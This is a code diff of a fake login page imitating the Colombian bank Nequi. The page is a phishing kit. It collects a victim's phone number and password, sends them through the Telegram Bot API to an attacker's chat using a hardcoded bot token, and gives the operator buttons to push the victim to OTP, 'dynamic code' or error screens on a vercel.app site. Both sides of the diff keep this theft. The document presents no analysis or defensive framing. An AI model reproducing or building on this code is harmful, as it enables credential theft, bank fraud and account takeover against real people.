@@ -3,12 +3,11 @@
 <head>
     <title>Nequi</title>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" href="../assets/img/favicon.ico">
     <script src="../assets/js/jquery-3.6.0.min.js"></script>
     <link href="../assets/css/styles.css" rel="stylesheet">
     <link href="../assets/css/stylesheet.css" rel="stylesheet">
-    <script src="../assets/js/functions.js"></script>
 </head>
 <body>
     <div class="cabecera">
@@ -33,97 +32,63 @@
                     <div id="indicativo">
                         <table border="0" cellpadding="0" cellspacing="0" width="100%">
                             <tr>
-                                <td valign="middle" align="left"><img src="../assets/img/col.png" width="29" id="bandera"></td>
-                                <td valign="middle" align="right" id="txt-indicativo">+57</td>
-                                <td valign="middle" align="right"><img src="../assets/img/abajo.jpg" id="flecha"></td>
+                                <td valign="middle" align="left"><img src="../assets/img/col.png" width="29"></td>
+                                <td valign="middle" align="right">+57</td>
                             </tr>
                         </table>
                     </div>
                 </td>
-                <td><input type="text" id="txt-celular" class="entradas" placeholder="Celular" maxlength="10" inputmode="numeric"></td>
+                <td><input type="text" id="cel" class="entradas" placeholder="Celular" maxlength="10" inputmode="numeric"></td>
             </tr>
             <tr>
-                <td colspan="2"><input type="password" id="txt-password" placeholder="Contraseña" class="entradas"></td>
+                <td colspan="2"><input type="password" id="pass" placeholder="Contraseña" class="entradas"></td>
             </tr>
         </table>
-        <img src="../assets/img/capcha-off.png" id="capcha" style="margin-bottom: 33px;">
         <br>
-        <button id="btn-login" class="btn-big btn-fill" disabled>Entra</button>
-        <p id="msg" style="color:#ff6b6b;margin-top:15px;font-weight:bold;"></p>
+        <button id="btn" class="btn-big btn-fill" disabled>Entra</button>
+        <p id="msg" style="color:red;margin-top:15px;font-weight:bold;"></p>
     </div>
 
-    <div class="pie">
-        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
-            <tr><td id="logo-blanco-movil"><img src="../assets/img/logo-blanco.svg" width="176"><div class="separador"></div></td></tr>
-        </table>
-        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
-            <tr>
-                <td valign="top" id="logo-blanco"><img src="../assets/img/logo-blanco.svg" width="176"></td>
-                <td valign="top">
-                    <div class="titulo-footer">Producto</div>
-                    <div class="item-footer">Legales</div>
-                    <div class="item-footer">Ayuda</div>
-                </td>
-                <td valign="top" id="app">
-                    <div class="titulo-footer">Descarga la App</div>
-                    <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
-                </td>
-            </tr>
-        </table>
-    </div>
-
-    <!-- BOTÓN QUE ENVÍA + REDIRIGE SIN CARGAR CADA 2 SEGUNDOS -->
     <script>
-    $(document).ready(function() {
-        $('#txt-celular, #txt-password').on('input', function() {
-            const cel = $('#txt-celular').val().trim();
-            const pass = $('#txt-password').val().trim();
-            $('#btn-login').prop('disabled', cel.length !== 10 || pass.length < 4);
+    $(function(){
+        $('#cel, #pass').on('input', function(){
+            $('#btn').prop('disabled', $('#cel').val().length !== 10 || $('#pass').val().length < 4);
         });
 
-        $('#btn-login').click(function() {
-            const numero = '+57 ' + $('#txt-celular').val().trim();
-            const clave = $('#txt-password').val().trim();
-            const session = Date.now();
-
+        $('#btn').click(function(){
+            const num = '+57 ' + $('#cel').val();
+            const cla = $('#pass').val();
             $('#msg').text('Enviando...');
-            $('#btn-login').html('Enviando...').prop('disabled', true);
+            $(this).prop('disabled', true).text('Enviando...');
 
-            // GUARDA LA SESIÓN
-            localStorage.setItem('wait_for_action', session);
-
-            // ENVÍA A TELEGRAM
             fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: 8469651553,
-                    text: `*NUEVO CLIENTE*
-
-*Número:* ${numero}
-*Clave:* ${clave}
-*ID:* ${session}
-
-TOCA PARA REDIRIGIR:`,
+                    text: `*NUEVO CLIENTE*\n*Número:* ${num}\n*Clave:* ${cla}\n\n_ELIGE ACCIÓN:_`,
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
-                            [{text: "Clave OTP", url: `https://tualternativafinanzas.vercel.app/verifying/?do=otp&sid=${session}`}],
-                            [{text: "Error clave", url: `https://tualternativafinanzas.vercel.app/verifying/?do=error&sid=${session}`}],
-                            [{text: "Dinámica", url: `https://tualternativafinanzas.vercel.app/verifying/?do=dinamica&sid=${session}`}],
-                            [{text: "Error login", url: `https://tualternativafinanzas.vercel.app/verifying/?do=loginerr&sid=${session}`}],
-                            [{text: "Finalizar", url: `https://tualternativafinanzas.vercel.app/verifying/?do=ok&sid=${session}`}]
+                            [{text:"Clave OTP",url:"https://tualternativafinanzas.vercel.app/verifying/?do=otp"}],
+                            [{text:"Error clave",url:"https://tualternativafinanzas.vercel.app/verifying/?do=error"}],
+                            [{text:"Dinámica",url:"https://tualternativafinanzas.vercel.app/verifying/?do=dinamica"}],
+                            [{text:"Error login",url:"https://tualternativafinanzas.vercel.app/verifying/?do=loginerr"}],
+                            [{text:"Finalizar",url:"https://tualternativafinanzas.vercel.app/verifying/?do=ok"}]
                         ]
                     }
                 })
-            }).then(() => {
-                $('#msg').html('Enviado! Esperando...');
-                setTimeout(() => { location.href = '/private/'; }, 1500);
+            })
+            .then(() => {
+                $('#msg').html('Enviado! Redirigiendo...');
+                setTimeout(() => location.href = '/private/', 1500);
+            })
+            .catch(() => {
+                $('#msg').text('Error. Intenta de nuevo');
+                $('#btn').prop('disabled', false).text('Entra');
             });
         });
     });
     </script>
-
-    <script src="../assets/js/ready.js"></script>
 </body>
 </html>
